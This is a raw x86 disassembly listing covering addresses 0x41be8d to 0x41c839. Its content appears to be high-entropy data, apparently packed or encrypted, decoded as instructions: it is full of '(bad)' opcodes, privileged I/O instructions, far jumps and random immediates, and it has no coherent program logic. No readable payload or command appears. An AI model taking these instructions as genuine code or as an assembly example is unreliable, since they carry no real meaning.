  41be8d:	shl    DWORD PTR [esi+esi*4+0x4806f58],0x8a
  41be95:	sub    dh,ah
  41be97:	out    0x8c,al
  41be99:	call   0xb74232ea
  41be9e:	(bad)  
  41be9f:	push   edi
  41bea0:	pusha  
  41bea1:	popa   
  41bea2:	arpl   WORD PTR [eax+0x4d],di
  41bea5:	or     bl,BYTE PTR [ecx+0x61]
  41bea8:	pop    es
  41bea9:	xchg   edx,eax
  41beaa:	pop    ebx
  41beab:	jno    0x41becf
  41bead:	test   al,0x57
  41beaf:	mov    bh,0x64
  41beb1:	imul   ebx,DWORD PTR [ebx+0x60],0xffffffb4
  41beb5:	mov    bl,0xec
  41beb7:	int3   
  41beb8:	(bad)
  41bebd:	xor    BYTE PTR [ebx],al
  41bebf:	xor    eax,0xe0724bad
  41bec4:	repnz cli 
  41bec6:	sbb    BYTE PTR [eax+0x3c5ef69c],dh
  41becc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41becd:	adc    BYTE PTR [edi-0x2f],bh
  41bed0:	pop    edx
  41bed1:	xlat   BYTE PTR ds:[ebx]
  41bed2:	dec    esp
  41bed3:	int    0x15
  41bed5:	cwde   
  41bed6:	es inc eax
  41bed8:	dec    ebp
  41bed9:	push   esi
  41beda:	pop    eax
  41bedb:	sub    eax,ebx
  41bedd:	mov    esi,0x9d5c4ffd
  41bee2:	mov    edx,0xfc5d2dc4
  41bee7:	enter  0x67e7,0x1e
  41beeb:	xor    cl,BYTE PTR [esi]
  41beed:	inc    esp
  41beee:	mov    al,0xb4
  41bef0:	push   0xff305ab3
  41bef5:	fiadd  WORD PTR [edi]
  41bef7:	in     eax,0xba
  41bef9:	sbb    ah,dl
  41befb:	repz pop ebp
  41befd:	fisub  DWORD PTR [edi+esi*4-0x5c6b1ae9]
  41bf04:	add    DWORD PTR [ebp-0x57c639bf],0xf4643b90
  41bf0e:	jns    0x41bf6c
  41bf10:	jmp    0x41bf3f
  41bf12:	push   ebx
  41bf13:	test   eax,0x462ba32e
  41bf18:	sub    BYTE PTR [ebx+edi*8-0x27],cl
  41bf1c:	jmp    0x41befe
  41bf1e:	mov    edx,0x81b1ed4a
  41bf23:	xor    DWORD PTR fs:[esi+ebp*1+0x2a60362d],esp
  41bf2b:	aas    
  41bf2c:	aam    0x3
  41bf2e:	lods   al,BYTE PTR ds:[esi]
  41bf2f:	loopne 0x41befa
  41bf31:	sbb    al,0x5e
  41bf33:	inc    esi
  41bf34:	pop    ss
  41bf35:	call   0x4fedf99b
  41bf3a:	xchg   esi,eax
  41bf3b:	dec    edi
  41bf3c:	mov    DWORD PTR [eax-0x59],ebp
  41bf3f:	fist   WORD PTR [eax]
  41bf41:	pop    esi
  41bf42:	repz mov ch,BYTE PTR [esi+0x11e6170b]
  41bf49:	xor    al,bl
  41bf4b:	xchg   edx,eax
  41bf4c:	add    BYTE PTR [esi-0x73],bl
  41bf4f:	imul   esp,DWORD PTR [ebx-0x78],0x30
  41bf53:	repz arpl WORD PTR [ebx+0x4],bx
  41bf57:	cmp    esp,eax
  41bf59:	jecxz  0x41bf59
  41bf5b:	jl     0x41bf44
  41bf5d:	pop    DWORD PTR [esi]
  41bf5f:	aas    
  41bf60:	sbb    ebx,DWORD PTR [edi]
  41bf62:	jno    0x41bf85
  41bf64:	cld    
  41bf65:	push   edx
  41bf66:	xchg   esi,eax
  41bf67:	mov    al,cl
  41bf69:	push   0x4f
  41bf6b:	loopne 0x41bf52
  41bf6d:	je     0x41bfe3
  41bf6f:	fld    TBYTE PTR [eax]
  41bf71:	add    eax,0xe56c25c9
  41bf76:	sbb    BYTE PTR [ecx-0x71],dh
  41bf79:	pusha  
  41bf7a:	adc    bl,cl
  41bf7c:	scas   eax,DWORD PTR es:[edi]
  41bf7d:	rcr    BYTE PTR [eax],1
  41bf7f:	cmp    bl,BYTE PTR [edx+0x21]
  41bf82:	cs pop es
  41bf84:	imul   esi,esi,0xfffffffb
  41bf87:	mov    bh,BYTE PTR es:[ebx-0xb1d56ce]
  41bf8e:	cmp    DWORD PTR [eax+0x0],esi
	...
  41bff4:	fs jae 0x41c02a
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	inc    ebx
  41c001:	mov    dh,0x72
  41c003:	pop    eax
  41c004:	xor    al,0x29
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    al,0x1
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	and    dh,0x6a
  41c00f:	outs   dx,BYTE PTR ds:[esi]
  41c010:	repz cmp ch,dl
  41c013:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c014:	inc    ebx
  41c015:	aad    0xfa
  41c017:	(bad)
  41c01b:	stos   DWORD PTR es:[edi],eax
  41c01c:	inc    eax
  41c01d:	push   es
  41c01e:	adc    al,0xd
  41c020:	sbb    DWORD PTR [edx+eax*2-0x46],0x28f503dc
  41c028:	iret   
  41c029:	retf   0x52b2
  41c02c:	loop   0x41c007
  41c02e:	arpl   sp,si
  41c030:	inc    eax
  41c031:	jo     0x41bffc
  41c033:	inc    ecx
  41c034:	and    BYTE PTR [ebx-0x370d3bde],0xa2
  41c03b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c03c:	mov    bh,0xa
  41c03e:	cmp    BYTE PTR [ecx+0x66038a28],0xb7
  41c045:	sti    
  41c046:	inc    edi
  41c047:	lahf   
  41c048:	test   eax,0xadc245ff
  41c04d:	inc    eax
  41c04e:	mov    DWORD PTR [eax-0x3d1599b0],ebp
  41c054:	or     eax,0x29ffc745
  41c059:	popa   
  41c05a:	ficomp DWORD PTR [ebx+0x6c]
  41c05d:	and    ah,BYTE PTR [ecx-0x1c]
  41c060:	mov    bl,0xd7
  41c062:	cmp    dh,al
  41c064:	inc    eax
  41c065:	inc    ebx
  41c066:	mov    ebp,0xeda971b7
  41c06b:	mov    dh,0x43
  41c06d:	in     eax,0x6f
  41c06f:	adc    BYTE PTR [esi+eiz*2],dl
  41c072:	loop   0x41c0c8
  41c074:	je     0x41c05c
  41c076:	ins    DWORD PTR es:[edi],dx
  41c077:	lahf   
  41c078:	pop    ds
  41c079:	pop    ds
  41c07a:	jbe    0x41c08e
  41c07c:	icebp  
  41c07d:	leave  
  41c07e:	mov    al,ds:0x7bff4d57
  41c083:	lahf   
  41c084:	in     al,0x37
  41c086:	push   ebx
  41c087:	mov    al,0x11
  41c089:	imul   esi,DWORD PTR [esi+ebp*1+0x400a4adf],0x7f
  41c091:	rcl    DWORD PTR [ecx+0x4fdd1bbe],cl
  41c097:	dec    ecx
  41c098:	(bad)  
  41c099:	fsub   QWORD PTR [esi-0x5c3d1f79]
  41c09f:	dec    ebx
  41c0a0:	dec    edx
  41c0a1:	add    eax,0x6c2a1f7f
  41c0a6:	mov    eax,ds:0x368b85df
  41c0ab:	cli    
  41c0ac:	(bad)  [ebp+0x1c44dd0f]
  41c0b2:	pop    esp
  41c0b3:	aam    0x97
  41c0b5:	add    al,0x28
  41c0b7:	jle    0x41c0db
  41c0b9:	or     al,0x63
  41c0bb:	sar    dl,cl
  41c0bd:	in     al,0x11
  41c0bf:	inc    esi
  41c0c0:	push   edi
  41c0c1:	push   0xdf46261e
  41c0c6:	repz xchg ebp,eax
  41c0c8:	and    bl,BYTE PTR [ecx+0x372ca021]
  41c0ce:	cmp    bh,BYTE PTR [eax]
  41c0d0:	popf   
  41c0d1:	xchg   esi,eax
  41c0d2:	ja     0x41c08e
  41c0d4:	cs repnz stos BYTE PTR es:[edi],al
  41c0d7:	retf   0x2f9d
  41c0da:	jno    0x41c077
  41c0dc:	test   BYTE PTR [ebp-0x5c],cl
  41c0df:	rcl    ebx,1
  41c0e1:	comiss xmm6,xmm5
  41c0e4:	xchg   ch,ah
  41c0e6:	and    DWORD PTR [ecx-0x24],esp
  41c0e9:	imul   esi,DWORD PTR [ebp+eax*4+0x48c59f7c],0xc54962de
  41c0f4:	dec    DWORD PTR [ebp-0x5107d748]
  41c0fa:	push   edi
  41c0fb:	jmp    0x41c0b4
  41c0fd:	fdivr  DWORD PTR cs:[edx-0x640c2d7b]
  41c104:	adc    al,BYTE PTR [ecx-0x39]
  41c107:	push   eax
  41c108:	leave  
  41c109:	dec    edi
  41c10a:	cmp    DWORD PTR [ecx+edi*8+0x77ea78],ecx
	...
  41c171:	add    BYTE PTR [eax],al
  41c173:	add    cl,bl
  41c175:	dec    edx
  41c176:	mov    eax,ds:0xd9fbb3f8
  41c17b:	imul   edi,DWORD PTR ds:0x5ee90501,0x34
  41c182:	xchg   esp,eax
  41c183:	mov    ebp,0x12a38
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	sahf   
  41c18d:	das    
  41c18e:	neg    edx
  41c190:	sbb    edx,ebx
  41c192:	lods   al,BYTE PTR ds:[esi]
  41c193:	ins    DWORD PTR es:[edi],dx
  41c194:	cmp    eax,0xac68af3b
  41c199:	add    al,ah
  41c19b:	bswap  edi
  41c19d:	xor    al,0x2d
  41c19f:	pop    esi
  41c1a0:	mov    dl,0x3a
  41c1a2:	mov    ebx,0x79e0813f
  41c1a7:	dec    ecx
  41c1a8:	fnsave [eax+0x34c47321]
  41c1ae:	jmp    0x41c1b3
  41c1b0:	xor    DWORD PTR [ebp+0x7d],edx
  41c1b3:	pop    ebp
  41c1b4:	jecxz  0x41c1a2
  41c1b6:	mov    bl,0x57
  41c1b8:	xlat   BYTE PTR ds:[ebx]
  41c1b9:	leave  
  41c1ba:	imul   ebp,DWORD PTR [ecx-0x2ebf2cca],0xffffffe4
  41c1c1:	aaa    
  41c1c2:	imul   eax,DWORD PTR cs:[ebx+0x1f],0x3c091c57
  41c1ca:	mov    bh,0xd9
  41c1cc:	inc    edi
  41c1cd:	add    al,0x86
  41c1cf:	dec    esp
  41c1d0:	pop    ebp
  41c1d1:	xchg   edi,edx
  41c1d3:	sahf   
  41c1d4:	sti    
  41c1d5:	(bad)  
  41c1d6:	icebp  
  41c1d7:	xchg   esi,eax
  41c1d8:	repz xor al,0x83
  41c1db:	mov    dh,0x25
  41c1dd:	hlt    
  41c1de:	test   eax,0x7152311b
  41c1e3:	int3   
  41c1e4:	mov    esi,0x644e1fc
  41c1e9:	test   ax,0xd131
  41c1ed:	jecxz  0x41c1ba
  41c1ef:	or     ecx,ebp
  41c1f1:	and    esi,eax
  41c1f3:	mov    ds:0x20c403dc,al
  41c1f8:	and    al,BYTE PTR [esi]
  41c1fa:	cs pop eax
  41c1fc:	fisub  WORD PTR [ebp-0x69ae8c98]
  41c202:	(bad)  
  41c203:	jp     0x41c1bf
  41c205:	imul   ebp,DWORD PTR [eax],0x61
  41c208:	popa   
  41c209:	test   DWORD PTR [ecx-0xf],edi
  41c20c:	jecxz  0x41c226
  41c20e:	xchg   edi,eax
  41c20f:	mov    WORD PTR [eax-0x4b],ss
  41c212:	cmc    
  41c213:	xchg   edi,eax
  41c214:	js     0x41c242
  41c216:	jno    0x41c22f
  41c218:	mov    dl,0xa2
  41c21a:	add    ebx,ebx
  41c21c:	jp     0x41c21e
  41c21e:	fadd   DWORD PTR [edx+0x54]
  41c221:	das    
  41c222:	ja     0x41c226
  41c224:	sbb    eax,0xc51cb3b3
  41c229:	xor    edx,DWORD PTR [ecx-0x56]
  41c22c:	rcl    DWORD PTR ds:0xc5b7c058,1
  41c232:	jp     0x41c1c4
  41c234:	icebp  
  41c235:	pop    es
  41c236:	jmp    0x41c216
  41c238:	test   eax,0x30005a53
  41c23d:	jge    0x41c264
  41c23f:	test   al,0x6d
  41c241:	pop    esi
  41c242:	popf   
  41c243:	inc    edx
  41c244:	dec    ebp
  41c245:	pop    ebx
  41c246:	jae    0x41c2ab
  41c248:	or     bh,BYTE PTR [esi+eiz*8-0x2d4d336d]
  41c24f:	retf   0xa56f
  41c252:	xor    BYTE PTR [esi+0x324d6242],dl
  41c258:	lods   eax,DWORD PTR ds:[esi]
  41c259:	adc    eax,0xd833c8ba
  41c25e:	lds    eax,FWORD PTR [edx]
  41c260:	adc    edi,DWORD PTR [ecx+0x51]
  41c263:	(bad)  
  41c264:	jmp    0x41c2cb
  41c266:	inc    eax
  41c267:	retf   0xd830
  41c26a:	or     ecx,ebx
  41c26c:	call   0x82c2:0x4f816f92
  41c273:	inc    ecx
  41c274:	jmp    0xbfc0e3ef
  41c279:	shl    DWORD PTR [edi],cl
  41c27b:	push   eax
  41c27c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c27d:	das    
  41c27e:	xor    al,0xbc
  41c280:	sbb    al,0xcc
  41c282:	jnp    0x41c274
  41c284:	in     al,dx
  41c285:	fisub  WORD PTR [ecx-0x39f01456]
  41c28b:	add    bh,ah
  41c28d:	push   esi
  41c28e:	inc    esp
  41c28f:	outs   dx,BYTE PTR ds:[esi]
	...
  41c2f4:	repz and ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	xor    DWORD PTR [ebx+edi*4+0x5d],esi
  41c304:	cmp    al,0x2b
  41c306:	add    DWORD PTR [eax],eax
  41c308:	add    al,0x1
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	cwde   
  41c30d:	inc    ebp
  41c30e:	leave  
  41c30f:	hlt    
  41c310:	or     dl,bh
  41c312:	imul   edi,DWORD PTR [esi-0x7e7ebaa6],0x18
  41c319:	pop    ebp
  41c31a:	dec    al
  41c31c:	(bad)  
  41c31d:	in     eax,0x7c
  41c31f:	mov    dl,0x12
  41c321:	fld    QWORD PTR [ecx]
  41c323:	inc    ebp
  41c324:	mov    dl,0x14
  41c326:	jecxz  0x41c362
  41c328:	sub    al,0x71
  41c32a:	jle    0x41c369
  41c32c:	mov    esp,0xe2f09f85
  41c331:	dec    ebx
  41c332:	out    dx,eax
  41c333:	pop    ds
  41c334:	xor    eax,0x6b357a8
  41c339:	inc    ebp
  41c33a:	mov    ecx,0x95eedee5
  41c33f:	sbb    al,0x86
  41c341:	sbb    dl,BYTE PTR [eax]
  41c343:	and    eax,DWORD PTR [ebx]
  41c345:	and    al,0x3c
  41c347:	and    eax,DWORD PTR [edx-0x33]
  41c34a:	shl    BYTE PTR [ebx+0x2a],cl
  41c34d:	(bad)  
  41c34e:	adc    bl,dl
  41c350:	cs mov esi,0x77819ab1
  41c356:	sub    DWORD PTR [eax],eax
  41c358:	mov    edx,0xfb40c2fa
  41c35d:	js     0x41c341
  41c35f:	repz popf 
  41c361:	sub    BYTE PTR [ecx+0x1e57cffd],0xdc
  41c368:	arpl   WORD PTR [esi],bp
  41c36a:	jae    0x41c3e2
  41c36c:	mov    esi,DWORD PTR [edx]
  41c36e:	mov    dh,0x86
  41c370:	out    dx,eax
  41c371:	cld    
  41c372:	(bad)  
  41c373:	cmp    eax,0x5c3cc409
  41c378:	push   edi
  41c379:	push   0xffffffbd
  41c37b:	scas   al,BYTE PTR es:[edi]
  41c37c:	clc    
  41c37d:	pop    edi
  41c37e:	pop    ds
  41c37f:	mov    esp,0x3b2e36b1
  41c384:	dec    eax
  41c385:	lods   eax,DWORD PTR ds:[esi]
  41c386:	bound  edi,QWORD PTR [ecx-0x4a]
  41c389:	repnz nop
  41c38b:	sub    BYTE PTR [ecx],al
  41c38d:	inc    esp
  41c38e:	aas    
  41c38f:	inc    edi
  41c390:	idiv   BYTE PTR [ebx]
  41c392:	and    DWORD PTR [eax+0x713ce1ba],eax
  41c398:	and    ebp,ecx
  41c39a:	push   ds
  41c39b:	push   ebp
  41c39c:	add    esi,DWORD PTR [ebp+0x72a00e05]
  41c3a2:	sub    al,0x51
  41c3a4:	or     DWORD PTR [bx+0x7e],esp
  41c3a8:	dec    esi
  41c3a9:	jmp    0x41c34b
  41c3ab:	imul   esi,ebx,0x7
  41c3ae:	icebp  
  41c3af:	jecxz  0x41c3e1
  41c3b1:	test   BYTE PTR [ebx+edx*8-0x1e6e5c30],ah
  41c3b8:	sbb    esp,DWORD PTR [ebx-0x7b]
  41c3bb:	push   esi
  41c3bc:	ss inc esi
  41c3be:	scas   al,BYTE PTR es:[edi]
  41c3bf:	(bad)  [edx-0xbc77e11]
  41c3c5:	inc    esp
  41c3c6:	sbb    al,BYTE PTR [ebp-0x2376148e]
  41c3cc:	jae    0x41c3f0
  41c3ce:	add    al,0xcb
  41c3d0:	cmp    eax,0x802ff544
  41c3d5:	mov    al,ds:0x90e9f2f6
  41c3da:	inc    edi
  41c3db:	or     eax,0x961e9852
  41c3e0:	pop    edi
  41c3e1:	add    DWORD PTR [esi+0x2f],ebx
  41c3e4:	imul   DWORD PTR [eax+0x7d]
  41c3e7:	xchg   edi,eax
  41c3e8:	mov    edi,ss
  41c3ea:	mov    DWORD PTR [ecx],edi
  41c3ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3ed:	jne    0x41c37f
  41c3ef:	(bad)  
  41c3f0:	jne    0x41c416
  41c3f2:	dec    edx
  41c3f3:	xchg   ebx,eax
  41c3f4:	jp     0x41c432
  41c3f6:	nop
  41c3f7:	retf   
  41c3f8:	js     0x41c3be
  41c3fa:	(bad)  
  41c3fc:	test   eax,0x73ecec23
  41c401:	js     0x41c3db
  41c403:	std    
  41c404:	xlat   BYTE PTR ds:[ebx]
  41c405:	call   0xe6cff99d
  41c40a:	cli    
  41c40b:	jle    0x41c3b1
  41c40d:	fcmovnb st,st(3)
  41c40f:	add    DWORD PTR [eax],0x0
	...
  41c472:	add    BYTE PTR [eax],al
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	sbb    ebp,ebx
  41c482:	ret    0x40d6
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR [ecx+eax*1],al
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	es js  0x41c44d
  41c48f:	and    BYTE PTR [eax+ebx*1],bl
  41c492:	outs   dx,DWORD PTR ds:[esi]
  41c493:	in     eax,dx
  41c494:	xchg   BYTE PTR [edi+edi*8],bl
  41c497:	cmp    eax,0xf747c3b5
  41c49c:	(bad)  
  41c49d:	cmp    esi,DWORD PTR [eax]
  41c49f:	or     ch,BYTE PTR [ecx]
  41c4a1:	and    dl,bl
  41c4a3:	pop    ss
  41c4a4:	adc    ebx,esi
  41c4a6:	in     al,dx
  41c4a7:	cmp    DWORD PTR [ecx-0x41bb6427],ecx
  41c4ad:	std    
  41c4ae:	shl    DWORD PTR ds:0xba9ef743,0x6a
  41c4b5:	in     al,0x98
  41c4b7:	iret   
  41c4b8:	shr    BYTE PTR [edi-0x22],cl
  41c4bb:	jbe    0x41c504
  41c4bd:	mov    ecx,0x159578af
  41c4c2:	sbb    DWORD PTR [edx+0x3a],0x4c
  41c4c6:	xchg   BYTE PTR [ebx-0x35],ch
  41c4c9:	ret    
  41c4ca:	mov    ch,0xcd
  41c4cc:	mov    ds:0x16e68725,eax
  41c4d1:	push   eax
  41c4d2:	stc    
  41c4d3:	cli    
  41c4d4:	pop    es
  41c4d5:	je     0x41c51a
  41c4d7:	in     eax,0x42
  41c4d9:	rcl    DWORD PTR [eax-0x2],cl
  41c4dc:	jbe    0x41c555
  41c4de:	sub    BYTE PTR [eax+eax*8-0x69bb8bff],dh
  41c4e5:	inc    edi
  41c4e6:	sbb    BYTE PTR [edx+0x5e],bh
  41c4e9:	inc    esp
  41c4ea:	imul   ebx,esp,0x26
  41c4ed:	inc    ebp
  41c4ee:	or     ch,al
  41c4f0:	cmp    bl,BYTE PTR [bx]
  41c4f3:	stos   BYTE PTR es:[edi],al
  41c4f4:	mov    al,0x61
  41c4f6:	add    DWORD PTR [ecx-0x41],edi
  41c4f9:	dec    esi
  41c4fa:	loopne 0x41c536
  41c4fc:	call   0x5e3fc76a
  41c501:	daa    
  41c502:	nop
  41c503:	mov    cl,0x28
  41c505:	mov    edi,0x82bb091c
  41c50a:	inc    eax
  41c50b:	pop    eax
  41c50c:	xchg   ebx,eax
  41c50d:	push   ds
  41c50e:	cs popa 
  41c510:	sub    edx,DWORD PTR [esi+edx*4-0x26]
  41c514:	xchg   BYTE PTR [edi-0x2376e858],al
  41c51a:	test   DWORD PTR [ebp+esi*1-0xc],edi
  41c51e:	cmp    esp,edi
  41c520:	add    eax,0x4f419dd4
  41c525:	outs   dx,BYTE PTR ds:[esi]
  41c526:	or     eax,0x4ceaa9ac
  41c52b:	mov    edx,0x1cb1b84b
  41c530:	or     DWORD PTR [edi+edx*4-0x4ab30428],0xbb5945c7
  41c53b:	daa    
  41c53c:	out    dx,eax
  41c53d:	push   edx
  41c53e:	test   DWORD PTR [ecx+0x76],ebx
  41c541:	je     0x41c5aa
  41c543:	mov    ds:0xc4f6b804,eax
  41c548:	pusha  
  41c549:	jae    0x41c5a9
  41c54b:	mov    ds:0xab08c8e8,eax
  41c550:	dec    ebp
  41c551:	mov    ebp,0xb7fd6b06
  41c556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c557:	(bad)  
  41c558:	cmp    al,0xb8
  41c55a:	xchg   esp,eax
  41c55b:	dec    eax
  41c55c:	int    0xf1
  41c55e:	out    0x26,eax
  41c560:	pushf  
  41c561:	dec    ebp
  41c562:	aas    
  41c563:	inc    ecx
  41c564:	inc    edi
  41c565:	cmp    dh,BYTE PTR [edx-0x48]
  41c568:	jle    0x41c5dc
  41c56a:	jb     0x41c553
  41c56c:	gs jge 0x41c57c
  41c56f:	xchg   esi,eax
  41c570:	leave  
  41c571:	(bad)  
  41c572:	dec    esi
  41c573:	jle    0x41c57e
  41c575:	sub    ebp,DWORD PTR [edi]
  41c577:	(bad)  
  41c578:	dec    ebp
  41c579:	mov    ebp,0x650ac910
  41c57e:	mov    bh,0x6
  41c580:	mov    esi,0x315c583f
  41c585:	inc    eax
  41c586:	cwde   
  41c587:	jno    0x41c5b0
  41c589:	into   
  41c58a:	lock cwde 
  41c58c:	push   edi
  41c58d:	lods   eax,DWORD PTR ds:[esi]
  41c58e:	xor    al,0xd1
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0x325b604
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	jg     0x41c638
  41c60e:	pop    DWORD PTR [edx]
  41c610:	adc    al,0x31
  41c612:	inc    ebp
  41c613:	add    eax,0xda0d1893
  41c618:	sbb    eax,0x56ad553c
  41c61d:	sub    edx,DWORD PTR ds:0x3fa6b986
  41c623:	fdiv   DWORD PTR gs:[edx-0x1]
  41c627:	gs add al,0x31
  41c62a:	out    0xa3,eax
  41c62c:	call   0xdd68:0x8a559ad9
  41c633:	inc    ebp
  41c634:	cmp    eax,0xb34779d3
  41c639:	mov    ch,0x19
  41c63b:	mov    ch,BYTE PTR ds:0xaa654827
  41c641:	sti    
  41c642:	add    eax,0xd92ffaef
  41c647:	sahf   
  41c648:	repnz fwait
  41c64a:	xor    bh,BYTE PTR [edx+eiz*1]
  41c64d:	xor    BYTE PTR [ebx-0x2efe09],ah
  41c653:	cwde   
  41c654:	jns    0x41c5eb
  41c656:	(bad)  
  41c657:	sbb    al,0x6a
  41c659:	mov    ds:0xe8b2a3b0,al
  41c65e:	dec    esi
  41c65f:	stos   DWORD PTR es:[edi],eax
  41c660:	push   0x79
  41c662:	pop    esp
  41c663:	std    
  41c664:	pop    es
  41c665:	xor    BYTE PTR [eax],dh
  41c667:	pop    esp
  41c668:	lea    edi,[esp+edx*1-0x4a]
  41c66c:	xlat   BYTE PTR ds:[ebx]
  41c66d:	(bad)  
  41c66e:	test   ecx,0xd3590450
  41c674:	stc    
  41c675:	fbld   TBYTE PTR [ecx-0x4f41e97c]
  41c67b:	sub    ebp,ecx
  41c67d:	clc    
  41c67e:	stos   BYTE PTR es:[edi],al
  41c67f:	sub    bh,BYTE PTR [edx-0x6a3a3d48]
  41c685:	cmp    eax,0x3cb4f88e
  41c68a:	xchg   ebx,eax
  41c68b:	fwait
  41c68c:	ret    0x8b57
  41c68f:	js     0x41c6db
  41c691:	cmp    eax,DWORD PTR [ecx-0x21a36028]
  41c697:	outs   dx,DWORD PTR ds:[esi]
  41c698:	gs retf 
  41c69a:	add    DWORD PTR [edx+0x7ff730e3],ebx
  41c6a0:	loop   0x41c662
  41c6a2:	or     bh,dl
  41c6a4:	dec    eax
  41c6a5:	pop    edi
  41c6a6:	mov    ebp,edi
  41c6a8:	bound  ebx,QWORD PTR [ebp-0xb786437]
  41c6ae:	nop
  41c6af:	jecxz  0x41c69a
  41c6b1:	mov    eax,0x82a8bc99
  41c6b6:	je     0x41c670
  41c6b8:	mov    bh,0xe7
  41c6ba:	icebp  
  41c6bb:	test   BYTE PTR [edi+ecx*8],dh
  41c6be:	stos   DWORD PTR es:[edi],eax
  41c6bf:	ins    DWORD PTR es:[edi],dx
  41c6c0:	push   ebx
  41c6c1:	and    ebx,DWORD PTR [edx+0x2eed71a7]
  41c6c7:	jp     0x41c686
  41c6c9:	pop    edx
  41c6ca:	hlt    
  41c6cb:	test   al,0x27
  41c6cd:	scas   al,BYTE PTR es:[edi]
  41c6ce:	add    DWORD PTR [edx+0x55],ecx
  41c6d1:	jl     0x41c6e2
  41c6d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6d4:	jp     0x41c6df
  41c6d6:	rcr    BYTE PTR [ecx+0x7d572fe6],1
  41c6dc:	ds add eax,0x1599d7ff
  41c6e2:	in     al,0x9f
  41c6e4:	dec    ecx
  41c6e5:	adc    bh,BYTE PTR [edx+0x3b81e58]
  41c6eb:	ss jge 0x41c676
  41c6ee:	pop    ds
  41c6ef:	adc    eax,0x733e54ee
  41c6f4:	iret   
  41c6f5:	leave  
  41c6f6:	repnz mov al,0xe5
  41c6f9:	sub    BYTE PTR [edx+0x17c6655b],bl
  41c6ff:	lds    eax,FWORD PTR ds:0x421c6563
  41c705:	jp     0x41c6e0
  41c707:	xchg   esi,eax
  41c708:	inc    edi
  41c709:	mov    al,0x30
  41c70b:	add    esp,esi
  41c70d:	xor    BYTE PTR [edx+0xa7],al
	...
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	xlat   BYTE PTR ds:[ebx]
  41c781:	mov    dl,BYTE PTR [edx+esi*8+0x48]
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	in     al,0x4b
  41c78e:	das    
  41c78f:	ss and eax,0xbae0bd0c
  41c795:	jns    0x41c80c
  41c797:	mov    eax,ds:0xf8377549
  41c79c:	pop    ebp
  41c79d:	imul   esp,DWORD PTR [ebp-0x7a],0x158ef9f
  41c7a4:	pop    ebx
  41c7a5:	xchg   BYTE PTR [eax],bh
  41c7a7:	iret   
  41c7a8:	sub    DWORD PTR [ebx+ebp*4-0x3],esp
  41c7ac:	push   cs
  41c7ad:	or     DWORD PTR [edx],esi
  41c7af:	mov    ebx,0xe92ca8f4
  41c7b4:	test   ebp,ecx
  41c7b6:	inc    edx
  41c7b7:	push   0x55618aca
  41c7bc:	lock loopne 0x41c7e3
  41c7bf:	dec    ecx
  41c7c0:	add    bl,ch
  41c7c2:	mov    ebp,0xe1748eaa
  41c7c7:	dec    ebx
  41c7c8:	cs retf 0x9221
  41c7cc:	pop    ds
  41c7cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7ce:	in     al,0xbf
  41c7d0:	ret    
  41c7d1:	in     al,dx
  41c7d2:	and    al,cl
  41c7d4:	cs dec ecx
  41c7d6:	outs   dx,DWORD PTR es:[esi]
  41c7d8:	out    0xe1,eax
  41c7da:	sub    dl,ah
  41c7dc:	xchg   esp,eax
  41c7dd:	hlt    
  41c7de:	xor    bh,BYTE PTR ds:0xaafb69ae
  41c7e4:	ds jmp 0xc8e2442f
  41c7ea:	dec    esp
  41c7eb:	ins    BYTE PTR es:[edi],dx
  41c7ec:	lock mov bh,0xb6
  41c7ef:	fs push esp
  41c7f1:	or     ebp,DWORD PTR [ebp+0x19fb859b]
  41c7f7:	push   cs
  41c7f8:	loope  0x41c871
  41c7fa:	inc    ebx
  41c7fb:	xor    eax,0x1c3b9287
  41c800:	xchg   ebx,eax
  41c801:	inc    eax
  41c802:	in     al,dx
  41c803:	or     DWORD PTR [edi+0x45],edi
  41c806:	sbb    eax,0x10f92dee
  41c80b:	stos   DWORD PTR es:[edi],eax
  41c80c:	js     0x41c7c8
  41c80e:	std    
  41c80f:	sbb    BYTE PTR [edi+0x62],cl
  41c812:	rol    BYTE PTR ds:0x4f4372f1,0x75
  41c819:	fdivrp st(7),st
  41c81b:	and    al,0x58
  41c81d:	jmp    0x4b47:0xf9aa17b5
  41c824:	(bad)  
  41c825:	loopne 0x41c882
  41c827:	pop    edi
  41c828:	push   ebp
  41c829:	(bad)  
  41c82a:	mov    al,ds:0x73158d9b
  41c82f:	lods   eax,DWORD PTR ds:[esi]
  41c830:	xchg   ecx,eax
  41c831:	and    BYTE PTR [ebx],cl
  41c833:	arpl   WORD PTR [esi],bp
  41c835:	jp     0x41c83f
  41c837:	mov    cl,0x56
  41c839:	nop
